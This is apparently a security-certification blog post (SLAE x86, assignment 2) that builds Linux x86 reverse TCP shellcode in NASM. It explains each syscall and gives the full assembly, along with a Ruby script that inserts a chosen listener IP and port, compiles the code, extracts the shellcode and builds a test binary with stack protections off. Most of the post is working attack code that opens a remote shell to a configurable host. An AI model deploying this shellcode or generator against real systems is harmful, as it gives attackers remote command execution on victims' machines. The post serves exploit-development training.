---
title: "SLAE x86 - Assignment 0x2"
date: 2021-10-20T06:38:37Z
draft: false
tags:
  - exploit_dev
  - assembly
categories:
  - certification
keywords:
  - slae
  - shellcode
  - assembly
---
# Reverse TCP Shellcode
## Objectives
- Create a shell reverse tcp shellcode
  - Reverse connects to configured IP and port
  - Execs shell on successful connection
- IP and port should be easily configurable

## Structure
Using reverse shell from msfvenom, the needed syscalls can be visualize with the help of [`libemu's sctest`](https://github.com/buffer/libemu) and [`dot tool`](https://graphviz.org/):

![](reverse_tcp_shellcode.png)

 Generated using:
 ```zsh {linenos=false}
 msfvenom --arch x86 --platform linux -p linux/x86/shell_reverse_tcp -f raw | sctest -vvv -Ss 10000 -G reverse_tcp_shellcode.dot
 dot reverse_tcp_shellcode.dot -T png -o reverse_tcp_shellcode.png
 ```
## Creating the NASM Code
### Syscalls and other values
- Below are the needed syscalls and respective opcodes from `/usr/include/asm/unistd_32.h`
```nasm {linenos=false}
  SOCKET      equ 0x167
  CONNECT     equ 0x16a
  DUP         equ 0x3f
  EXECVE      equ 0xb
```

- These are declared under `section .text` for better reading of the nasm code together with other constants:
```nasm {linenos=false}
  ; settings
  PORT        equ 0xd204        ; default 1234
  XOR_IP      equ 0xfeffff80    ; default (127.0.0.1 XORed with 0xffffffff)
                                ; this is to avoid null in shellcode

  ; argument constants
  AF_INET     equ 0x2
  SOCK_STREAM equ 0x1
```

### Socket(2)
- This will create an endpoint for communication and returns a file descriptor that refers the endpoint.
 The usage are detailed in: https://man7.org/linux/man-pages/man2/socket.2.html
- Synopsis: `socket(int domain, int type, int protocol)`
- Syscall arguments:
  - ebx: AF_INET     = 2
  - ecx: SOCK_STREAM = 1
  - edx: IPPROTO_IP  = 6

 NASM Code:
 ```nasm {linenostart=28}
   mov ax, SOCKET
   mov bl, AF_INET
   mov cl, SOCK_STREAM
   mov dl, 0x6
   int 0x80
 ```

### Connect(2)
- This will connects the socket referred to by the file descriptor sockfd returned from [Socket(2)](#socket2).
 The usage are detailed in: https://man7.org/linux/man-pages/man2/connect.2.html
- Synopsis: `connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)`
- Syscall arguments:
  - ebx: sockfd   = eax(returned from previous syscall)
  - ecx: sockaddr = { AF_INET; PORT; IP_ADDR }
    - AF_INET = 2
    - PORT    = 1234
    - IP      = 127.0.0.1
  - edx: addrlen  = 16

 NASM Code:
 ```nasm {linenostart=36}
  xchg edi, eax
  xor ecx, ecx
  mul ecx
  push ecx
  push ecx
  mov edx, XOR_IP
  xor edx, 0xffffffff
  push edx
  push word PORT
  push word AF_INET
  mov ecx, esp
  push 0x10
  pop edx
  mov ebx, edi
  mov ax, CONNECT
  int 0x80
 ```

### Dup(2)
- This will allocate the file descriptors, virtual handles used to access certain process I/O operations and to simulate remote user's input and display to the terminal.
 The usage are detailed in: https://man7.org/linux/man-pages/man2/dup.2.html
- Synopsis: `dup(int oldfd, int newfd, int flags)`
- Syscall arguments:
  - ebx: sockfd   = same with [Connect(2)](#connect2)
  - ecx: sockaddr = stdin, stdout, and stderr
    - stdin  = 0x0
    - stdout = 0x1
    - stderr = 0x2

 NASM Code:
 ```nasm {linenostart=54}
  push 0x3
  pop ecx
  mov ebx, edi
loop:
  mov al, DUP
  dec ecx
  int 0x80
  jne loop
 ```

### Execve(2)
- This will execute the `/bin/sh` program on the remote machine
 The usage are detailed in: https://man7.org/linux/man-pages/man2/execve.2.html
- Synopsis: `execve(const char *pathname, char *const argv[], char *const envp[])`
- Syscall arguments:
  - ebx: pathname   = 'bin//sh' address in stack
  - ecx: argv       = 0x0
  - ecx: envp       = 0x0

 NASM Code:
 ```nasm {linenostart=64}
  xor ebx, ebx
  mul ebx
  push ebx
  push 0x68732f2f
  push 0x6e69622f
  mov ebx, esp
  mov al, EXECVE
  int 0x80
 ```
## Final NASM Code
```nasm
; Purpose: Reverse TCP shellcode

global _start

section .text
  ; settings
  PORT        equ 0xd204        ; default 1234
  XOR_IP      equ 0xfeffff80    ; default (127.0.0.1 XORed with 0xffffffff)
                                ; this is to avoid null in shellcode

  ; syscall kernel opcodes found in /usr/include/asm/unistd_32.h
  SOCKET      equ 0x167
  CONNECT     equ 0x16a
  DUP         equ 0x3f
  EXECVE      equ 0xb

  ; argument constants
  AF_INET     equ 0x2
  SOCK_STREAM equ 0x1

_start:
  ; clear registers
  xor ebx, ebx
  xor ecx, ecx
  mul ecx

  ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
  mov ax, SOCKET
  mov bl, AF_INET
  mov cl, SOCK_STREAM
  mov dl, 0x6
  int 0x80                      ; syscall socket(2)

  ; connect(sockfd, &sockaddr, 16)
  ; sockaddr = {AF_INET; PORT; IP_ADDR}
  xchg edi, eax                 ; edi = sockfd
  xor ecx, ecx                  ; clear ecx
  mul ecx                       ; clear eax and edx
  push ecx                      ; 0x0
  mov edx, XOR_IP               ; copy 0xfeffff80 to edx
  xor edx, 0xffffffff           ; edx xor 0xffffffff = 0x01000017f
  push edx                      ; push IP address to stack
  push word PORT                ; esp = 0xd204
  push word AF_INET             ; esp = 0xd2040002
  mov ecx, esp                  ; ecx = esp address
  push 0x10                     ; 16
  pop edx                       ; edx = 16
  mov ebx, edi                  ; ebx = sockfd
  mov ax, CONNECT               ; connect(2)
  int 0x80                      ; syscall connect(2)

  ; dup2(sockfd, fd)
  push 0x3                      ; prepare esp for ecx
  pop ecx                       ; ecx = 0x3
  mov ebx, edi                  ; ebx = sockfd
loop:
  mov al, DUP                   ; dup(2)
  dec ecx                       ; decrement ecx to coverl all 0x2, 0x1, and 0x0 fds
  int 0x80                      ; syscall dup(2)
  jne loop                      ; loop until ecx is zero

  ; execve('/bin//sh', NULL, NULL)
  xor ebx, ebx                  ; clear ebx
  mul ebx                       ; clear eax and edx
  push ebx                      ; push NULL
  push 0x68732f2f               ; "hs//"
  push 0x6e69622f               ; "nib/"
  mov ebx, esp                  ; ebx = esp address
  mov al, EXECVE                ; execve(2)
  int 0x80                      ; syscal execve(2)
```
## Dynamic Configuration
Using a simple Ruby script below, the `PORT` number and `IP Address` can be dynamically assigned:
```ruby
#!/usr/bin/env ruby
# Author: Jason Villaluna

require 'optparse'

def run
  parse_args
  @xor_ip = xor_ip(@ip)
  @port = to_hex(@port)
  replace_ip
  replace_port
  compile_nasm
  @shellcode = generate_shellcode
  replace_shellcode
  compile_binary
rescue OptionParser::MissingArgument
  puts "Missing argument:"
  @parser.parse %w[--help]
rescue StandardError => e
  puts "An error #{e.inspect} occurred"
  exit(1)
end

# Convert the IP into the XORed value with 0xffffffff
# This is needed to avoid null bytes when used with the nasm code
def xor_ip(ip)
  ip_hex = ip.split('.').reverse.map(&:to_i)
    .map { |n|  n.to_s(16).size.odd? ? n.to_s(16).prepend('0') : n.to_s(16) }
    .join.prepend('0x').hex
  xor_ip = ip_hex ^ 0xffffffff
  xor_ip.to_s(16).prepend('0x')
end

# Convert number into hex format used by the nasm code
def to_hex(number)
  hex = number.to_s(16)
  hex = hex.size.even? ? hex : hex.prepend('0')
  hex.scan(/../).reverse.join.prepend('0x')
end

# Replace a value inside a file
def replace_content(filename = "#{@filename}.nasm")
  file_content = File.read(filename)
  yield(file_content)
  File.write(filename, file_content)
end

# Replace the XORed IP value in the nasm file
def replace_ip
  replace_content do |nasm_code|
    nasm_code.gsub!(/XOR_IP\s*equ\s\S+/, "XOR_IP      equ #{@xor_ip}")
  end
end

# Replace the port number in the nasm file
def replace_port
  replace_content do |nasm_code|
    nasm_code.gsub!(/PORT\s*equ\s\S+/, "PORT        equ #{@port}")
  end
end

# Compile the nasm code
def compile_nasm
  `nasm -f elf32 -o #{@filename}.o #{@filename}.nasm`
  `ld -m elf_i386 -s -o #{@filename} #{@filename}.o`
end

# Generate shellcode using objdump
def generate_shellcode
  objdump = `objdump -d #{@filename}`
  objdump.split("\n").map { |line| line.split("\t")[1] }
    .compact.map(&:split).join('\x').prepend('\x')
end

# Replace shellcode in the shellcode tester program
def replace_shellcode
  replace_content('./shellcode.c') do |c_code|
    c_code.gsub!(/\"\S+\"\;/, "\"#{@shellcode}\"\;")
  end
end

# Compile the shellcode into binary with the help of the shellcode.c program
def compile_binary
  `gcc -fno-stack-protector -m32 -z execstack shellcode.c -o shellcode 2> /dev/null`
end

def parse_args
  @parser = OptionParser.new do |opts|
    opts.banner = "Usage: #{$0} [options]"
    opts.separator ""
    opts.separator "Options:"

    opts.on("--ip", "-i IP_ADDR", "IP of the listener") do |value|
      @ip = value
    end

    opts.on("--port", "-p PORT", "Port number of the listener") do |value|
      @port = value.to_i
    end

    opts.on("--nasm", "-n NASM", "Basename of the nasm code") do |value|
      @filename = value
    end

    opts.on_tail("--help", "-h", "Print options") do |show_help|
      warn opts
      exit(0)
    end
  end
  @parser.parse!
end

if __FILE__ == $PROGRAM_NAME
  run
  puts "Successfully generated \e[32mshellcode\e[0m binary!"
end
```
### Script usage and shellcode testing
![](reverse_tcp_shellcode.gif)

---
This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: [http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: SLAE - 1558

---
[`Link to Github repository`](https://github.com/jsnv-dev/slae_x86_assignments/tree/main/A2) | [`Link to index page`](../slae_x86)
